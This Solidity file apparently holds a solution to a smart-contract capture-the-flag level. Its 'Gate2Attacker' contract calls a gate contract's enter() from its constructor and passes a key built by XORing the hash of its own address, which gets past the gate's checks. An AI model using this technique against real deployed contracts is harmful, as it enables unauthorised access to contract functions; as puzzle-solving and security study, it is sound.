pragma solidity ^0.6.0;

interface Gate{
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Gate2Attacker{

    constructor(address addr) public {
        Gate impl = Gate(addr);
        bytes8 input = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        impl.enter(input);
    }
}

